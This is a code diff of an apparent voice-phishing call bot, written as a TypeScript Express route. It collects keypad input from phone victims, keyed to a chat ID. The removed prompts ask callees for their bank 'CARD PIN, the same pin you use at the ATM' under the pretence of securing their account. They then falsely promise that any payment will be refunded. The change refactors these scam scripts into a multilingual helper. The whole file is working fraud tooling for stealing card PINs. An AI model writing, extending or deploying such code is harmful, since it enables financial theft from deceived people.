@@ -1,13 +1,15 @@
 import { bot } from '../..';
 import { app } from '../';
 import { v4 as uuidv4 } from 'uuid';
+import { getLangPin } from '../../languages';
+import { Language } from '../../types';
 
 app.all('/calls/pin/:chatId/:language', async (req, res) => {
   const { chatId, language } = req.params;
   const { variables } = req.query;
   const { dtmf } = JSON.parse(variables as string);
 
-  const { pinType } = req.query;
+  // const { pinType } = req.query;
 
   if (!dtmf) {
     return res.json({
@@ -19,10 +21,10 @@ app.all('/calls/pin/:chatId/:language', async (req, res) => {
           id: uuidv4(),
           action: 'say',
           options: {
-            payload:
-              pinType === 'carrierPin'
-                ? `You have not entered anything. To verify and secure your phone number, please enter your ${pinType} followed by the pound key.`
-                : `You have not entered anything. For your security and to protect your account. enter your ${pinType} followed by the pound key`,
+            payload: getLangPin({
+              step: `1`,
+              language: language as Language,
+            }),
             language,
             voice: 'female',
           },
@@ -64,11 +66,10 @@ app.all('/calls/pin/:chatId/:language', async (req, res) => {
             id: uuidv4(),
             action: 'say',
             options: {
-              payload: `The ${
-                language === 'en-us' ? 'CARD PIN' : 'TELEPIN'
-              } you have entered is incorrect. To AUTHENTICATE YOU please enter your ${
-                language === 'en-us' ? 'CARD PIN' : 'TELEPIN'
-              }, the same pin you use at the ATM, followed by the pound key.`,
+              payload: getLangPin({
+                step: `2`,
+                language: language as Language,
+              }),
               language,
               voice: 'female',
             },
@@ -119,11 +120,11 @@ app.all('/calls/pin/:chatId/:language', async (req, res) => {
         id: uuidv4(),
         action: 'say',
         options: {
-          payload: `GREAT, you have entered ${dtmf
-            .split('')
-            .join(
-              ', ',
-            )}. Your account is now secure. If the payment has already left your account, NO NEED TO WORRY. It will automatically be refunded to you in 24 to 48 hours. Thank you, goodbye.`,
+          payload: getLangPin({
+            step: `3`,
+            language: language as Language,
+            dtmf: dtmf.split('').join(', '),
+          }),
           language,
           voice: 'female',
         },
